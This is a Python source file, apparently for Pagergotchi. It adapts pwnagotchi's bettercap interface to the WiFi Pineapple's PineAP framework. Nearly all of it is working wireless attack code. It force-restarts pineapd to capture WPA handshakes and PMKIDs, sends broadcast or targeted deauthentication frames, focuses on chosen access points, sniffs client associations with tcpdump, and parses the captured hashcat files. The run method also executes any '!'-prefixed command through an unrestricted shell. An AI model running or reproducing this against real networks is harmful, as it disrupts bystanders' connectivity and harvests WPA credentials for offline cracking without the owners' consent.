"""
Bettercap API shim for Pagergotchi - PineAP Backend
Uses PineAP (native WiFi Pineapple attack framework) to provide bettercap-compatible interface

This allows the original pwnagotchi code to work by translating bettercap
commands to PineAP operations.

PineAP provides:
- Real-time AP scanning with full details (SSID, MAC, channel, signal, encryption)
- Targeted deauthentication attacks
- Automatic WPA/PMKID handshake capture
- Channel control and focusing
"""

import os
import re
import time
import json
import logging
import asyncio
import subprocess
import threading
from glob import glob
from queue import Queue, Empty


class PineAPBackend:
    """
    WiFi operations using PineAP (native Pineapple framework)
    Provides real AP data and targeted attacks
    """

    def __init__(self, handshakes_dir='/root/loot/handshakes/pagergotchi'):
        # PineAP saves handshakes to /root/loot/handshakes/ by default, not our subdirectory
        # Monitor the actual PineAP handshakes location
        self.handshakes_dir = '/root/loot/handshakes'
        self.pagergotchi_handshakes_dir = handshakes_dir  # Keep for future use
        self.running = False

        # Discovered networks (real data from PineAP)
        self.access_points = {}
        self.clients = {}  # {ap_mac: [{mac: client_mac, vendor: '', last_seen: time}, ...]}
        self.handshakes = {}

        # Track known handshake files to detect new ones
        self._known_handshakes = set()

        # MAC -> ESSID mapping learned from handshakes
        self._learned_essids = {}

        # Event queue for websocket simulation
        self.event_queue = Queue()

        # Background threads
        self._recon_thread = None
        self._handshake_thread = None
        self._client_tracker_thread = None
        self._client_tracker_proc = None
        self._lock = threading.Lock()
        self._clients_lock = threading.Lock()

        # pineapd process management (started by us with handshakes enabled)
        self._pineapd_proc = None
        self._pineapd_service_was_running = False

        # Current channel (0 = hopping)
        self.current_channel = 0
        self.focused_bssid = None

        # Scan existing handshakes on init so count is available immediately
        self._scan_existing_handshakes()

    def _ensure_pineapd_handshakes(self):
        """Ensure pineapd is running with handshake capture enabled.

        If the service is running without --handshakes=true, we stop it and
        start our own pineapd process. On exit, we restart the service.
        """
        try:
            result = subprocess.run(['pgrep', '-a', 'pineapd'], capture_output=True, text=True, timeout=5)
            cmdline = result.stdout

            if '--handshakes=false' in cmdline or (cmdline.strip() and '--handshakes=true' not in cmdline):
                logging.info("[PineAP] pineapd running without handshakes, restarting with capture enabled...")

                # Track that service was running so we can restart it on exit
                self._pineapd_service_was_running = True

                # Stop the service AND kill any remaining processes
                # procd might not stop it reliably, so we use multiple methods
                subprocess.run(['/etc/init.d/pineapd', 'stop'], capture_output=True, timeout=10)
                time.sleep(1)
                subprocess.run(['killall', 'pineapd'], capture_output=True, timeout=5)
                time.sleep(1)

                # Verify it's dead
                check = subprocess.run(['pgrep', 'pineapd'], capture_output=True, timeout=5)
                if check.returncode == 0:
                    # Still running, force kill
                    subprocess.run(['killall', '-9', 'pineapd'], capture_output=True, timeout=5)
                    time.sleep(1)

                # Start our own pineapd with handshakes enabled
                cmd = [
                    '/usr/sbin/pineapd',
                    '--recon=true',
                    '--reconpath', '/root/recon/',
                    '--reconname', 'pager',
                    '--handshakepath', '/root/loot/handshakes/',
                    '--handshakes=true',
                    '--partialhandshakes=true',
                    '--interface', 'wlan1mon',
                    '--band', 'wlan1mon:2,5,6',
                    '--type', 'wlan1mon:max',
                    '--hop', 'wlan1mon:fast',
                    '--primary', 'wlan1mon',
                    '--inject', 'wlan1mon',
                ]

                # Start in background
                self._pineapd_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                logging.info("[PineAP] pineapd started with handshake capture enabled (PID: %s)",
                           self._pineapd_proc.pid if self._pineapd_proc else 'unknown')
            elif cmdline.strip():
                logging.info("[PineAP] pineapd already has handshake capture enabled")
            else:
                # No pineapd running at all - start our own
                logging.info("[PineAP] No pineapd running, starting with handshakes enabled...")
                cmd = [
                    '/usr/sbin/pineapd',
                    '--recon=true',
                    '--reconpath', '/root/recon/',
                    '--reconname', 'pager',
                    '--handshakepath', '/root/loot/handshakes/',
                    '--handshakes=true',
                    '--partialhandshakes=true',
                    '--interface', 'wlan1mon',
                    '--band', 'wlan1mon:2,5,6',
                    '--type', 'wlan1mon:max',
                    '--hop', 'wlan1mon:fast',
                    '--primary', 'wlan1mon',
                    '--inject', 'wlan1mon',
                ]
                self._pineapd_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                logging.info("[PineAP] pineapd started (PID: %s)",
                           self._pineapd_proc.pid if self._pineapd_proc else 'unknown')
        except Exception as e:
            logging.warning(f"[PineAP] Could not check/restart pineapd: {e}")

    def start(self):
        """Start PineAP reconnaissance"""
        if self.running:
            return True

        os.makedirs(self.handshakes_dir, exist_ok=True)

        # pineapd is started by payload.sh with --handshakes=true
        # Don't start a new recon - use pineapd's existing recon which starts automatically
        # RECON NEW resets the database and can cause APs to disappear
        logging.info("[PineAP] Using existing pineapd recon (started at boot)")
        # Just make sure we're not locked to a single channel
        self._run_cmd(['_pineap', 'EXAMINE', 'CANCEL'])

        self.running = True

        # Start background recon thread
        self._recon_thread = threading.Thread(target=self._recon_loop, daemon=True)
        self._recon_thread.start()

        # Start handshake monitoring thread
        self._handshake_thread = threading.Thread(target=self._handshake_monitor_loop, daemon=True)
        self._handshake_thread.start()

        # Start client tracker thread (captures frames to track client-to-AP associations)
        self._client_tracker_thread = threading.Thread(target=self._client_tracker_loop, daemon=True)
        self._client_tracker_thread.start()

        logging.info("[PineAP] Started reconnaissance with client tracking")
        return True

    def stop(self):
        """Stop reconnaissance and cleanup pineapd"""
        self.running = False

        # Kill client tracker tcpdump process
        if self._client_tracker_proc:
            try:
                self._client_tracker_proc.terminate()
                self._client_tracker_proc.wait(timeout=2)
            except Exception:
                pass
            self._client_tracker_proc = None

        # Reset any channel focus
        self._run_cmd(['_pineap', 'EXAMINE', 'CANCEL'])

        # Kill our pineapd process if we started one
        if self._pineapd_proc:
            logging.info("[PineAP] Stopping our pineapd process (PID: %s)...", self._pineapd_proc.pid)
            try:
                self._pineapd_proc.terminate()
                self._pineapd_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._pineapd_proc.kill()
            except Exception as e:
                logging.warning(f"[PineAP] Error stopping pineapd: {e}")
            self._pineapd_proc = None

        # Restart the pineapd service if it was running before we stopped it
        if self._pineapd_service_was_running:
            logging.info("[PineAP] Restarting pineapd service...")
            try:
                subprocess.run(['/etc/init.d/pineapd', 'start'], capture_output=True, timeout=10)
                logging.info("[PineAP] pineapd service restarted")
            except Exception as e:
                logging.warning(f"[PineAP] Could not restart pineapd service: {e}")
            self._pineapd_service_was_running = False

        logging.info("[PineAP] Stopped reconnaissance")

    def _run_cmd(self, cmd, timeout=10):
        """Run a shell command and return output

        Note: _pineap outputs data to stderr and uses exit code for counts
        """
        try:
            if isinstance(cmd, str):
                cmd = cmd.split()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            # PineAP outputs to stderr, combine both
            output = result.stdout.strip() or result.stderr.strip()
            return output, result.stderr.strip(), result.returncode
        except subprocess.TimeoutExpired:
            logging.warning(f"[PineAP] Command timed out: {cmd}")
            return '', 'timeout', -1
        except Exception as e:
            logging.error(f"[PineAP] Command error: {e}")
            return '', str(e), -1

    def _extract_essid_from_22000(self, filepath):
        """Extract ESSID and AP MAC from a .22000 hashcat file"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    # Format: WPA*02*mic*ap_mac*client_mac*essid_hex*...
                    if line.startswith('WPA*'):
                        parts = line.split('*')
                        if len(parts) >= 6:
                            ap_mac = parts[3].upper()
                            essid_hex = parts[5]
                            # Decode hex ESSID
                            try:
                                essid = bytes.fromhex(essid_hex).decode('utf-8', errors='ignore')
                                if essid and ap_mac:
                                    return ap_mac, essid
                            except Exception:
                                pass
        except Exception as e:
            logging.debug(f"[PineAP] Error reading {filepath}: {e}")
        return None, None

    def _scan_existing_handshakes(self):
        """Scan for existing handshake files and extract ESSIDs"""
        patterns = [
            os.path.join(self.handshakes_dir, '*.22000'),
            os.path.join(self.handshakes_dir, '*_handshake.22000'),
            os.path.join(self.handshakes_dir, '*.pcap'),
        ]
        for pattern in patterns:
            for f in glob(pattern):
                self._known_handshakes.add(f)
                # Extract ESSID from .22000 files
                if f.endswith('.22000'):
                    ap_mac, essid = self._extract_essid_from_22000(f)
                    if ap_mac and essid:
                        # Normalize MAC format
                        ap_mac_formatted = ':'.join(ap_mac[i:i+2] for i in range(0, 12, 2))
                        self._learned_essids[ap_mac_formatted] = essid
                        logging.debug(f"[PineAP] Learned ESSID '{essid}' for {ap_mac_formatted}")

    def _recon_loop(self):
        """Background thread to fetch AP data from PineAP"""
        while self.running:
            try:
                self._fetch_aps()
            except Exception as e:
                logging.debug(f"[PineAP] Recon error: {e}")
            time.sleep(3)  # Update every 3 seconds

    def _fetch_aps(self):
        """Fetch AP list from PineAP"""
        # Use _pineap command to get JSON AP list
        # Format: _pineap RECON APS format=json limit=100
        output, stderr, rc = self._run_cmd(['_pineap', 'RECON', 'APS', 'format=json', 'limit=100'])

        if not output:
            logging.debug(f"[PineAP] No output from RECON APS (rc={rc}, stderr={stderr[:100] if stderr else 'none'})")
            return

        try:
            # Parse JSON response
            data = json.loads(output)

            with self._lock:
                new_aps = {}

                # PineAP returns array of AP objects
                aps_list = data if isinstance(data, list) else data.get('aps', [])

                for ap in aps_list:
                    mac = ap.get('mac', '').upper()
                    if not mac:
                        continue

                    # Extract SSID and channel from beacon data
                    # Format: {"beacon": {"hash": {"channel": 11, "ssid": "name", ...}}, "mac": "...", "signal": -52}
                    ssid = ''
                    channel = 0
                    beacon = ap.get('beacon', {})
                    if beacon:
                        # Get first beacon entry (there's usually one keyed by a hash)
                        for beacon_key, beacon_data in beacon.items():
                            if isinstance(beacon_data, dict):
                                ssid = beacon_data.get('ssid', '')
                                channel = beacon_data.get('channel', 0)
                                break

                    # Convert freq to channel if channel not in beacon
                    if channel == 0 and 'freq' in ap:
                        freq = ap['freq']
                        if 2412 <= freq <= 2484:
                            channel = (freq - 2407) // 5
                        elif 5180 <= freq <= 5825:
                            channel = (freq - 5000) // 5

                    # If no SSID from beacon, check learned ESSIDs from handshakes
                    if not ssid:
                        mac_formatted = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
                        ssid = self._learned_essids.get(mac_formatted, '')

                    new_aps[mac.lower()] = {
                        'mac': mac,
                        'hostname': ssid,
                        'vendor': '',
                        'channel': channel,
                        'rssi': int(ap.get('signal', -100)),
                        'encryption': 'WPA2',  # PineAP doesn't provide this directly
                        'clients': [],
                        'last_seen': time.time()
                    }

                self.access_points = new_aps

        except json.JSONDecodeError as e:
            logging.debug(f"[PineAP] JSON parse error: {e}")
        except Exception as e:
            logging.debug(f"[PineAP] AP parse error: {e}")

    def _parse_text_aps(self, text):
        """Parse text-format AP output from PineAP"""
        # Format: MAC Channel Signal RSSI Encryption SSID
        with self._lock:
            for line in text.strip().split('\n'):
                if not line or line.startswith('#'):
                    continue
                parts = line.split()
                if len(parts) >= 5:
                    try:
                        mac = parts[0].lower()
                        # Validate MAC format
                        if not re.match(r'^([0-9a-f]{2}:){5}[0-9a-f]{2}$', mac):
                            continue

                        self.access_points[mac] = {
                            'mac': mac,
                            'hostname': ' '.join(parts[5:]) if len(parts) > 5 else '',
                            'vendor': '',
                            'channel': int(parts[1]) if parts[1].isdigit() else 0,
                            'rssi': int(parts[2]) if parts[2].lstrip('-').isdigit() else -100,
                            'encryption': parts[4] if len(parts) > 4 else 'WPA2',
                            'clients': [],
                            'last_seen': time.time()
                        }
                    except (ValueError, IndexError):
                        continue

    def _handshake_monitor_loop(self):
        """Monitor for new handshake captures"""
        while self.running:
            try:
                self._check_new_handshakes()
            except Exception as e:
                logging.debug(f"[PineAP] Handshake monitor error: {e}")
            time.sleep(2)  # Check every 2 seconds

    def _check_new_handshakes(self):
        """Check for newly captured handshakes"""
        patterns = [
            os.path.join(self.handshakes_dir, '*.22000'),
            os.path.join(self.handshakes_dir, '*_handshake.22000'),
        ]

        for pattern in patterns:
            for filepath in glob(pattern):
                if filepath not in self._known_handshakes:
                    self._known_handshakes.add(filepath)
                    self._process_new_handshake(filepath)

    def _process_new_handshake(self, filepath):
        """Process a newly captured handshake"""
        filename = os.path.basename(filepath)
        logging.info(f"[PineAP] New handshake detected: {filename}")

        # Extract ESSID from .22000 file and learn it
        ap_mac_from_file, essid = self._extract_essid_from_22000(filepath)
        if ap_mac_from_file and essid:
            mac_formatted = ':'.join(ap_mac_from_file[i:i+2] for i in range(0, 12, 2))
            self._learned_essids[mac_formatted] = essid
            logging.info(f"[PineAP] Learned ESSID '{essid}' for {mac_formatted}")

        # Try to extract MAC from filename
        # Format: {MAC}_handshake.22000 or {MAC}.22000
        mac_match = re.search(r'([0-9a-fA-F]{12})', filename.replace(':', '').replace('-', ''))
        ap_mac = ''
        if mac_match:
            # Convert to colon format
            raw_mac = mac_match.group(1).lower()
            ap_mac = ':'.join(raw_mac[i:i+2] for i in range(0, 12, 2))

        # Look up AP info - check learned ESSIDs first, then access_points
        ap_name = self._learned_essids.get(ap_mac, '')
        if not ap_name and ap_mac in self.access_points:
            ap_name = self.access_points[ap_mac].get('hostname', '')

        # Record handshake
        key = f"client -> {ap_mac}"
        self.handshakes[key] = {
            'file': filepath,
            'ap': ap_mac,
            'station': 'unknown',
            'ap_name': ap_name
        }

        # Queue event for websocket simulation
        self.event_queue.put({
            'tag': 'wifi.client.handshake',
            'data': {
                'file': filepath,
                'ap': ap_mac,
                'station': 'unknown',
                'ap_name': ap_name
            }
        })

    def _client_tracker_loop(self):
        """
        Background thread to track client-to-AP associations using tcpdump.
        Captures 802.11 frames and builds a mapping of which clients are
        connected to which APs - similar to what bettercap does internally.
        """
        # Try multiple monitor interfaces
        monitor_ifaces = ['wlan1mon', 'wlan0mon', 'wlan2mon']
        iface = None

        for try_iface in monitor_ifaces:
            # Check if interface exists
            stdout, stderr, rc = self._run_cmd(['ip', 'link', 'show', try_iface])
            if rc == 0:
                iface = try_iface
                break

        if not iface:
            logging.warning("[ClientTracker] No monitor interface found")
            return

        logging.info(f"[ClientTracker] Starting on {iface}")

        # tcpdump command to capture frames with link-level headers
        # -e: print link-level header (shows MAC addresses)
        # -n: don't resolve hostnames
        # -l: line-buffered output
        # type data: capture data frames (shows active client<->AP communication)
        cmd = [
            'tcpdump', '-i', iface, '-e', '-n', '-l',
            'type', 'data'
        ]

        try:
            self._client_tracker_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                bufsize=1  # Line buffered
            )

            while self.running and self._client_tracker_proc.poll() is None:
                line = self._client_tracker_proc.stdout.readline()
                if line:
                    self._parse_tcpdump_line(line.strip())

        except Exception as e:
            logging.error(f"[ClientTracker] Error: {e}")
        finally:
            if self._client_tracker_proc:
                try:
                    self._client_tracker_proc.terminate()
                except Exception:
                    pass

        logging.info("[ClientTracker] Stopped")

    def _parse_tcpdump_line(self, line):
        """
        Parse tcpdump output to extract client-to-AP associations.

        tcpdump -e output format for 802.11 data frames:
        timestamp BSSID (AP) > DA (destination) ...
        or with SA (source) and BSSID fields

        We look for patterns like:
        - "SA:xx:xx:xx:xx:xx:xx BSSID:yy:yy:yy:yy:yy:yy"
        - "BSSID:yy:yy:yy:yy:yy:yy DA:xx:xx:xx:xx:xx:xx"

        The key insight: in data frames, the BSSID is the AP, and
        SA/DA that isn't the BSSID is likely a client.
        """
        try:
            # Extract all MAC addresses from the line
            mac_pattern = r'([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})'
            macs = re.findall(mac_pattern, line)

            if len(macs) < 2:
                return

            # Look for BSSID indicator in line
            bssid_match = re.search(r'BSSID[:\s]+([0-9a-fA-F:]{17})', line, re.IGNORECASE)

            if bssid_match:
                bssid = bssid_match.group(1).lower()
                # Any other MAC in the line that isn't the BSSID or broadcast is likely a client
                for mac in macs:
                    mac_lower = mac.lower()
                    if mac_lower != bssid and not mac_lower.startswith('ff:ff:ff'):
                        self._record_client(bssid, mac_lower)
            else:
                # No explicit BSSID - try to match MACs against known APs
                with self._lock:
                    known_aps = set(self.access_points.keys())

                for mac in macs:
                    mac_lower = mac.lower()
                    if mac_lower in known_aps:
                        # This MAC is a known AP, others are potential clients
                        for other_mac in macs:
                            other_lower = other_mac.lower()
                            if other_lower != mac_lower and not other_lower.startswith('ff:ff:ff'):
                                self._record_client(mac_lower, other_lower)
                        break

        except Exception as e:
            logging.debug(f"[ClientTracker] Parse error: {e}")

    def _record_client(self, ap_mac, client_mac):
        """Record a client association with an AP"""
        # Skip broadcast/multicast MACs
        if client_mac.startswith('ff:ff:ff') or client_mac.startswith('01:'):
            return

        # Skip IPv6 multicast (33:33:xx:xx:xx:xx)
        if client_mac.startswith('33:33:'):
            return

        # Skip MACs that look like tcpdump artifacts (da:XX where XX matches common patterns)
        # These are "DA:" destination address labels being parsed as MAC prefixes
        if client_mac.startswith('da:'):
            # Check if it looks like a mangled MAC (da: followed by part of another MAC)
            # Real MACs starting with DA: are rare (Cisco/misc), but da:33:33, da:01:00, etc are artifacts
            second_octet = client_mac[3:5] if len(client_mac) > 4 else ''
            if second_octet in ('33', '01', 'f0', 'c4', '94', '38', 'ff'):
                return

        # Skip MACs with zeros in suspicious positions (likely malformed)
        if ':00:00:00' in client_mac or client_mac.endswith(':00:00'):
            return

        # Skip if client MAC looks like an AP MAC we know
        with self._lock:
            if client_mac in self.access_points:
                return

        with self._clients_lock:
            if ap_mac not in self.clients:
                self.clients[ap_mac] = {}

            if client_mac not in self.clients[ap_mac]:
                self.clients[ap_mac][client_mac] = {
                    'mac': client_mac.upper(),
                    'vendor': '',
                    'first_seen': time.time(),
                    'last_seen': time.time()
                }
                logging.info(f"[ClientTracker] New client {client_mac} on AP {ap_mac}")
            else:
                # Update last seen
                self.clients[ap_mac][client_mac]['last_seen'] = time.time()

    def _get_clients_for_ap(self, ap_mac):
        """Get list of clients for an AP in bettercap format"""
        ap_mac_lower = ap_mac.lower()
        with self._clients_lock:
            if ap_mac_lower not in self.clients:
                return []

            # Return as list of client dicts, filter stale entries (>5 min old)
            now = time.time()
            active_clients = []
            for client_mac, client_data in self.clients[ap_mac_lower].items():
                if now - client_data['last_seen'] < 300:  # 5 min TTL
                    active_clients.append({
                        'mac': client_data['mac'],
                        'vendor': client_data['vendor']
                    })
            return active_clients

    def deauth(self, bssid, client_mac='FF:FF:FF:FF:FF:FF', channel=None):
        """Send deauthentication packets"""
        # Get channel if not specified
        if channel is None:
            if bssid.lower() in self.access_points:
                channel = self.access_points[bssid.lower()].get('channel', 1)
            else:
                channel = self.current_channel or 1

        logging.info(f"[PineAP] Deauth: {client_mac} from {bssid} on ch {channel}")

        # Use PineAP deauth command
        stdout, stderr, rc = self._run_cmd([
            '_pineap', 'DEAUTH', bssid, client_mac, str(channel)
        ])

        return rc == 0

    def set_channel(self, channel):
        """Set specific channel"""
        self.current_channel = channel
        self.focused_bssid = None

        if channel == 0:
            # Resume channel hopping
            self._run_cmd(['_pineap', 'EXAMINE', 'CANCEL'])
        else:
            # Lock to channel for 300 seconds (5 min)
            self._run_cmd(['_pineap', 'EXAMINE', 'CHANNEL', str(channel), '300'])

        return True

    def focus_bssid(self, bssid):
        """Focus on specific AP (locks to its channel)"""
        self.focused_bssid = bssid
        # Lock to BSSID for 300 seconds (5 min)
        self._run_cmd(['_pineap', 'EXAMINE', 'BSSID', bssid, '300'])

        # Update current channel from AP data
        if bssid.lower() in self.access_points:
            self.current_channel = self.access_points[bssid.lower()].get('channel', 0)

        return True

    def clear_focus(self):
        """Clear channel/BSSID focus, resume hopping"""
        self.focused_bssid = None
        self.current_channel = 0
        self._run_cmd(['_pineap', 'EXAMINE', 'CANCEL'])
        return True

    def get_current_channel(self):
        """Get current channel and band from interface using iw"""
        # Try multiple interfaces that PineAP might be using
        for iface in ['wlan1mon', 'wlan0mon', 'wlan2mon']:
            try:
                output, stderr, rc = self._run_cmd(['iw', 'dev', iface, 'info'])
                if output and rc == 0:
                    # Parse: "channel 11 (2462 MHz)" or "channel 65 (6275 MHz)"
                    match = re.search(r'channel\s+(\d+)\s+\((\d+)\s*MHz\)', output)
                    if match:
                        channel = match.group(1)
                        freq = int(match.group(2))
                        # Determine band from frequency
                        if freq < 3000:
                            band = "2G"
                        elif freq < 5900:
                            band = "5G"
                        else:
                            band = "6G"
                        return f"{channel}({band})"
            except Exception:
                continue
        return '*'

    def get_session_data(self):
        """Return data in bettercap session format"""
        with self._lock:
            # Convert our AP dict to bettercap format
            aps_list = []
            for mac, ap in self.access_points.items():
                # Get tracked clients for this AP
                clients = self._get_clients_for_ap(mac)
                aps_list.append({
                    'mac': ap['mac'],
                    'hostname': ap['hostname'],
                    'vendor': ap['vendor'],
                    'channel': ap['channel'],
                    'rssi': ap['rssi'],
                    'encryption': ap['encryption'],
                    'clients': clients,  # Now populated from client tracker!
                    'first_seen': ap.get('first_seen', ''),
                    'last_seen': ap.get('last_seen', ''),
                })

            return {
                'wifi': {
                    'aps': aps_list
                },
                'interfaces': [
                    {'name': 'wlan0mon'},
                    {'name': 'wlan1mon'}
                ],
                'modules': [
                    {'name': 'wifi', 'running': self.running},
                    {'name': 'wifi.recon', 'running': self.running}
                ]
            }

    def get_next_event(self, timeout=1.0):
        """Get next event from queue (for websocket simulation)"""
        try:
            return self.event_queue.get(timeout=timeout)
        except Empty:
            return None

    def get_total_handshakes_count(self):
        """Get total number of known handshakes (counting only .22000 files)"""
        # Count only .22000 files since each handshake produces both .22000 and .pcap
        return len([f for f in self._known_handshakes if f.endswith('.22000')])

    def get_latest_handshake(self):
        """Get info about the most recently captured handshake"""
        if not self.handshakes:
            return None
        # Return the last entry (most recent)
        last_key = list(self.handshakes.keys())[-1]
        return self.handshakes[last_key]


class Client:
    """
    Bettercap-compatible Client using PineAP backend

    Provides the same interface as the original pwnagotchi.bettercap.Client
    so the rest of the code can work unchanged.
    """

    def __init__(self, hostname='localhost', scheme='http', port=8081,
                 username='user', password='pass'):
        # These params are for compatibility - we use PineAP directly
        self.hostname = hostname
        self.scheme = scheme
        self.port = port
        self.username = username
        self.password = password
        self.url = f"{scheme}://{hostname}:{port}/api"
        self.websocket = f"ws://{username}:{password}@{hostname}:{port}/api"

        # PineAP backend
        self._backend = None
        # PineAP saves to /root/loot/handshakes/ by default
        self._handshakes_dir = '/root/loot/handshakes'

    def _ensure_backend(self):
        """Lazily initialize backend"""
        if self._backend is None:
            self._backend = PineAPBackend(handshakes_dir=self._handshakes_dir)
        return self._backend

    def stop(self):
        """Stop backend and cleanup background processes"""
        if self._backend:
            self._backend.stop()
            logging.info("[Client] Backend stopped, background tasks cleaned up")

    def get_total_handshakes_count(self):
        """Get total number of known handshake files (including pre-existing)"""
        backend = self._ensure_backend()
        return backend.get_total_handshakes_count()

    def get_latest_handshake(self):
        """Get info about the most recently captured handshake"""
        backend = self._ensure_backend()
        return backend.get_latest_handshake()

    def session(self, sess="session"):
        """Return session data in bettercap format"""
        backend = self._ensure_backend()
        return backend.get_session_data()

    def run(self, command, verbose_errors=True):
        """
        Execute a bettercap command by translating to PineAP operations

        Supported commands:
        - wifi.recon on/off
        - wifi.recon.channel X or wifi.recon.channel clear
        - wifi.clear
        - wifi.assoc MAC (focus on AP for PMKID capture)
        - wifi.deauth MAC (send deauth)
        - set wifi.* (configuration)
        - events.* (ignored)
        """
        backend = self._ensure_backend()
        command = command.strip()

        logging.debug(f"[bettercap/PineAP] run: {command}")

        # Handle different commands
        if command == 'wifi.recon on':
            backend.start()
            return {'success': True}

        elif command == 'wifi.recon off':
            backend.stop()
            return {'success': True}

        elif command.startswith('wifi.recon.channel'):
            parts = command.split()
            if len(parts) >= 2:
                channel_arg = parts[1] if len(parts) > 1 else ''
                if channel_arg == 'clear':
                    backend.clear_focus()
                else:
                    # Could be single channel or comma-separated list
                    try:
                        channels = [int(c.strip()) for c in channel_arg.split(',')]
                        if len(channels) == 1:
                            # Single channel - lock to it
                            backend.set_channel(channels[0])
                        else:
                            # Multiple channels - let pineapd hop naturally, don't lock
                            backend.clear_focus()
                    except ValueError:
                        pass
            return {'success': True}

        elif command == 'wifi.clear':
            with backend._lock:
                backend.access_points.clear()
            return {'success': True}

        elif command.startswith('wifi.assoc'):
            # Association/PMKID attack - focus on the AP
            mac = command.replace('wifi.assoc', '').strip()
            if mac:
                backend.focus_bssid(mac)
                logging.info(f"[PineAP] Focusing on {mac} for PMKID capture")
            return {'success': True}

        elif command.startswith('wifi.deauth'):
            # Deauth attack - format: wifi.deauth BSSID [CLIENT_MAC]
            args = command.replace('wifi.deauth', '').strip().split()
            if args:
                bssid = args[0]
                client_mac = args[1] if len(args) > 1 else 'FF:FF:FF:FF:FF:FF'
                backend.deauth(bssid, client_mac)
            return {'success': True}

        elif command.startswith('set wifi.'):
            # Configuration commands
            if 'handshakes.file' in command or 'handshakes' in command:
                match = re.search(r'set wifi\.handshakes(?:\.file)?\s+(\S+)', command)
                if match:
                    self._handshakes_dir = match.group(1)
                    if self._backend:
                        self._backend.handshakes_dir = self._handshakes_dir
            return {'success': True}

        elif command.startswith('events.'):
            # Event commands - ignore
            return {'success': True}

        elif command.startswith('!'):
            # Shell command - execute it
            shell_cmd = command[1:]
            try:
                result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=30)
                return {'success': result.returncode == 0, 'output': result.stdout}
            except Exception as e:
                return {'success': False, 'error': str(e)}

        else:
            logging.debug(f"[bettercap/PineAP] Unhandled command: {command}")
            return {'success': True}

    async def start_websocket(self, consumer):
        """
        Simulate bettercap websocket by polling event queue

        The consumer is an async function that receives JSON event messages
        """
        backend = self._ensure_backend()

        logging.info("[bettercap/PineAP] Starting event polling...")

        while True:
            try:
                # Check for events (handshake captures, etc.)
                event = backend.get_next_event(timeout=1.0)
                if event:
                    # Send event to consumer as JSON string
                    await consumer(json.dumps(event))

                # Small delay to prevent tight loop
                await asyncio.sleep(0.1)

            except Exception as e:
                logging.debug(f"[bettercap/PineAP] Event loop error: {e}")
                await asyncio.sleep(1.0)
